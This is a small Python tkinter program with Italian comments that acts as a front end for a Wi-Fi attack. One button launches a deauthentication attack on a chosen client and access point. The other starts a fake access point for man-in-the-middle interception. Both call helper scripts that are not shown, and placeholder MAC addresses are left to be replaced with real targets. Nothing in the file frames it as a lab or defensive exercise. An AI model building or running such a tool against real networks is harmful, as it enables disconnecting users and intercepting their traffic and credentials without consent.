import tkinter as tk
from tkinter import messagebox
import subprocess
import os

# --- CONFIGURAZIONE ---
# Inserisci qui i valori reali oppure chiedili via GUI più avanti
INTERFACCIA_MONITOR = "wlan0mon"
MAC_CLIENT = "AA:BB:CC:DD:EE:FF"
MAC_AP = "11:22:33:44:55:66"

# Funzione per attacco deauth
def run_deauth():
    try:
        subprocess.Popen([
            "sudo", "python3", "deauth.py",
            "-i", INTERFACCIA_MONITOR,
            "-t", MAC_CLIENT,
            "-a", MAC_AP
        ])
        messagebox.showinfo("Deauth", "Attacco deauth avviato.")
    except Exception as e:
        messagebox.showerror("Errore Deauth", str(e))

# Funzione per avviare AP fasullo + MITM
def start_fake_ap():
    try:
        subprocess.Popen(["bash", "setup_fake_ap.sh"])
        messagebox.showinfo("Fake AP", "Access Point fasullo avviato.")
    except Exception as e:
        messagebox.showerror("Errore AP", str(e))

# GUI principale
root = tk.Tk()
root.title("WiFi MITM Tool")
root.geometry("320x180")

tk.Label(root, text="WiFi MITM Attack GUI", font=("Arial", 14)).pack(pady=10)

tk.Button(root, text="1. Disconnetti Utente", command=run_deauth, bg="red", fg="white", width=25).pack(pady=10)
tk.Button(root, text="2. Avvia WiFi Falsa + MITM", command=start_fake_ap, bg="green", fg="white", width=25).pack(pady=10)

root.mainloop()
